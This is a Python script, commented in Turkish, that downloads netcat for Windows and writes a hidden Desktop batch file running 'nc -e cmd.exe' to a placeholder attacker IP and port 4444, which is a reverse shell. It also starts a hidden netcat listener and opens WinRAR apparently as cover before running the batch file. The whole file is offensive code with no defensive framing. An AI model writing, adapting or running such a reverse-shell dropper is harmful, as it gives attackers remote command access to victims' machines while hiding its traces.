import os
import requests
import zipfile
import subprocess
import time

# Netcat'i indirme fonksiyonu
def download_netcat():
    url = "https://eternallybored.org/misc/netcat/netcat-win32-1.11.zip"
    nc_zip_path = os.path.expanduser("~\\nc.zip")
    nc_extract_path = os.path.expanduser("~\\netcat")

    # Netcat'i indir
    response = requests.get(url)
    with open(nc_zip_path, 'wb') as f:
        f.write(response.content)

    # Netcat'i zipten çıkar
    with zipfile.ZipFile(nc_zip_path, 'r') as zip_ref:
        zip_ref.extractall(nc_extract_path)

    return os.path.join(nc_extract_path, 'nc.exe')

# Bat dosyasını oluşturma fonksiyonu
def create_bat_file(nc_path, attacker_ip, attacker_port):
    bat_content = f"@echo off\n{nc_path} -e cmd.exe {attacker_ip} {attacker_port}"
    bat_path = os.path.expanduser("~\\Desktop\\reverse_shell.bat")

    with open(bat_path, 'w') as f:
        f.write(bat_content)

    # Dosyayı gizli yap
    subprocess.call(['attrib', '+h', bat_path])

    return bat_path

# Netcat listener'ı gizli başlatma fonksiyonu
def start_nc_listener(nc_path, listener_port):
    subprocess.Popen([nc_path, '-lvnp', str(listener_port)], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

# WinRAR'ı açıp bat dosyasını çalıştırma fonksiyonu
def execute_bat_via_winrar(bat_path):
    winrar_path = "C:\\Program Files\\WinRAR\\WinRAR.exe"
    subprocess.Popen([winrar_path])
    time.sleep(1)  # WinRAR'ın açılmasını bekle

    # Bat dosyasını çalıştırma
    subprocess.Popen(["cmd", "/c", bat_path])

# Ana işleyiş
def main():
    attacker_ip = "attacker-ip"  # Saldırganın IP adresini buraya yaz
    attacker_port = 4444          # Saldırganın dinlediği portu buraya yaz
    listener_port = 4444

    # Netcat'i indir ve zipten çıkar
    nc_path = download_netcat()

    # Bat dosyasını oluştur
    bat_path = create_bat_file(nc_path, attacker_ip, attacker_port)

    # Netcat listener'ı gizli olarak başlat
    start_nc_listener(nc_path, listener_port)

    # WinRAR üzerinden bat dosyasını çalıştır
    execute_bat_via_winrar(bat_path)

if __name__ == "__main__":
    main()
